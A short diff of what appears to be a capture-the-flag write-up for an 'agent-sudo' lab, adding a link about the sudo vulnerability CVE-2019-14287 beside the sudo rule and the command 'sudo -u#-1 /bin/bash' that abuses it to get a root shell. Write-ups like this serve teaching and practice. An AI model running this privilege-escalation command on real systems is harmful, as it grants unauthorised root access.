@@ -296,6 +296,8 @@ User james may run the following commands on agent-sudo:
 ```
 👽(ALL, !root)
 
+https://blog.aquasec.com/cve-2019-14287-sudo-linux-vulnerability
+
 ```
 james@agent-sudo:~$ sudo -u#-1 /bin/bash
 ```
